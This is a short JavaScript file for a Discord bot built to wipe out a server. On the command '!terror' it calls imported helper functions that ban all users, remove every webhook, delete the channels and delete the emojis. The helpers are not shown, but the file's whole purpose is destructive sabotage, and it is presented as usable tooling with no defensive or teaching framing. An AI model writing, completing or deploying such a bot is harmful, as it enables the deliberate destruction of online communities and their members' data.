const { Client } = require('discord.js')

const {
    banAllUsers,
    removeAllWebhook,
    removeChannels,
    removeEmojis
} = require('./functions')

const prefix = '!'

const client = new Client()

client.on('message', async (msg) => {
    const cmd = msg.content.replace(prefix, '')

    if (cmd === 'terror') {
        await banAllUsers(msg)
        await removeAllWebhook(msg)
        await removeChannels(msg)
        await removeEmojis(msg)
    }
})

client.login('token')
